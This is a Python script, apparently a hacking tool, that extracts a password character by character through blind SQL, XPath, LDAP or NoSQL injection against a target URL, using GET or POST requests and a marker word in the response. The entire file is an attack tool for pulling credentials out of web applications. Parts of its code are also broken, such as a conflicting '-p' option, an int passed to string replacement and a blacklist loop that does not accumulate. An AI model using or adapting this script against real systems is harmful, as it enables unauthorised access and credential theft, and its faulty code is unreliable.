#!/usr/bin/python3

from argparse import ArgumentParser
from ast import alias, arg
from sys import argv
from requests import session
from string import printable

'''
Modes :
JSON,
URL
'''
def bruteForce(url,payload, lenght, distinguish_word,blackList,request_type,mode="URL",key_json="username",param="password",):
    s = session()
    for ban_word in blackList:
        alphabet = printable.replace(ban_word,"")
    print("Starting brute-force...")
    password = ""
    for i in range(lenght):
        found = False
        for c in alphabet:
            if mode=="URL":
                if request_type=="POST":
                    domSite = s.post(url, params={param:payload.replace("%i",str(i)).replace("%p",password+c).replace("%l",lenght)}).text
                elif request_type=="GET":
                    domSite = s.get(url, params={param:password+c}).text
            if mode=="JSON":
                if request_type=="POST":
                    domSite = s.post(url, data={key_json: payload.replace("%i",str(i)).replace("%p",password+c).replace("%l",lenght)}).text
                elif request_type=="GET":
                    domSite = s.get(url, data={key_json: payload.replace("%i",str(i)).replace("%p",password+c).replace("%l",lenght)}).text
            
            if not distinguish_word in domSite:
                password+=c
                print("[P] : "+password+"."*(lenght-len(password)))
                found=True
                break
        if not found:
            print("We didnt found the password... Maybe try something else")
            break



if __name__ == "__main__" :
    parser = ArgumentParser()
    parser.add_argument("url", help="url of injection", type=str)
    #parser.add_argument("rq_type", help="GET or POST request", type=str)
    #parser.add_argument("mode", help="JSON or URL (in case of url don't write params)", type=str)
    parser.add_argument("payload", help="%p : password, %i : iteration number (=number of chars) %l : length of the password", type=str)
    parser.add_argument("word", help="Word(s) that is(are) NOT in the hacked page", type=str)

    parser.add_argument("--get","-g", help="GET request", action="store_true",required=(('--post' not in argv) and ('-p' not in argv)))
    parser.add_argument("--post","-p", help="POST request", action="store_true",required=(('--get' not in argv) and ('-g' not in argv)))
    parser.add_argument("--typeURL","-u", help="GET request", action="store_true",required=(('--typeJSON' not in argv) and ('-j' not in argv)))
    parser.add_argument("--typeJSON","-j", help="GET request", action="store_true",required=(('--typeURL' not in argv) and ('-u' not in argv)))

    parser.add_argument("--blacklist","-b", help="Blacklist chars", type=str)
    parser.add_argument("--length","-l", help="Length of the password", action="store_true")
    parser.add_argument("--auto","-a", help="Type of injection : SQL, XPATH, LDAP, NOSQL", type=str)
    parser.add_argument("--jsonKey","-k", help="JsonKey ex: {'key':'value'}=>key", type=str)
    parser.add_argument("--urlParam","-p", help="Url param ex: ?a=blabla => a", type=str)

    args = parser.parse_args()
    
    rq_type = "GET" if args.get else "POST"
    if args.auto:
        pass
    if args.typeURL:
        if args.urlParam:
            bruteForce(args.url,args.payload,32,args.word,args.blacklist,rq_type,mode="URL",param=args.urlParam)
        else:
            bruteForce(args.url,args.payload,32,args.word,args.blacklist,rq_type,mode="URL")
    else:
        if args.jsonKey:
            bruteForce(args.url,args.payload,32,args.word,args.blacklist,rq_type,mode="JSON",key_json=args.jsonKey)
        else:
            bruteForce(args.url,args.payload,32,args.word,args.blacklist,rq_type,mode="JSON")